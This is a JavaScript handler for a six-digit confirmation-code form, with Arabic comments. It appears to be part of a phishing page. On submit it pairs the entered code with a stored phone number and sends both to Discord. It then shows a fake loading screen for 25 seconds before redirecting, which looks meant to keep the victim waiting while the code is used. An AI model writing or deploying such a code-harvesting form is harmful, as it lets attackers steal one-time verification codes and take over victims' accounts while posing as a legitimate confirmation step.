// معالج نموذج رمز التأكيد

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('confirmationForm');
    const codeInput = document.getElementById('text');
    const submitBtn = document.getElementById('confirmCodeBtn');
    const errorMsg = document.getElementById('errorMsg');
    const successMsg = document.getElementById('successMsg');

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // إخفاء الرسائل السابقة
        errorMsg.style.display = 'none';
        successMsg.style.display = 'none';
        
        const code = codeInput.value.trim();
        
        // التحقق من الرمز
        if (!validateCode(code)) {
            errorMsg.textContent = '⚠️ يرجى إدخال رمز التأكيد المكون من 6 أرقام';
            errorMsg.style.display = 'block';
            return;
        }
        
        // تعطيل النموذج
        disableForm('confirmationForm');
        
        try {
            // الحصول على رقم الهاتف المحفوظ
            const contactNumber = getFromStorage('contactNumber') || 'غير معروف';
            
            // تنسيق الرسالة
            const message = `
✅ APP التأكيد
📱 رقم التواصل: ${contactNumber}
🔢 رمز التأكيد: ${code}
    = = = = = =
`;
            
            // إرسال البيانات إلى Discord
            const success = await sendToDiscord(message);
            
            if (success) {
                successMsg.textContent = '✅ تم إرسال رمز التأكيد بنجاح';
                successMsg.style.display = 'block';
                
                // عرض نافذة التحميل
                showLoading();
                
                // الانتظار 25 ثانية ثم الانتقال
                setTimeout(() => {
                    window.location.href = 'about.html';
                }, 25000);
            } else {
                errorMsg.textContent = '❌ فشل الإرسال، يرجى المحاولة لاحقاً';
                errorMsg.style.display = 'block';
                enableForm('confirmationForm');
            }
        } catch (error) {
            console.error('خطأ:', error);
            errorMsg.textContent = '❌ فشل الإرسال، يرجى المحاولة لاحقاً';
            errorMsg.style.display = 'block';
            enableForm('confirmationForm');
        }
    });
    
    // السماح بالأرقام فقط
    codeInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
    });
});